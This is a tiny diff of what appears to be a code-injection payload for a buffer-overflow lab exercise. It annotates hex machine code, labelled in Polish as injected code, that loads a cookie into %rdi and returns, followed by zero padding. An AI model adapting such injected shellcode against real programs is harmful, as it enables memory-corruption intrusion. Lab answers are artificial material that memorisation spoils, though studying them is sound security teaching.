@@ -1,4 +1,4 @@
-/* wstrzyknięty kod */
+/* wstrzyknięty kod - mov $COOKIE, %rdi; ret */
 48 c7 c7 29 c5 eb 74 c3
 /* padding */
 00 00 00 00 00 00 00 00
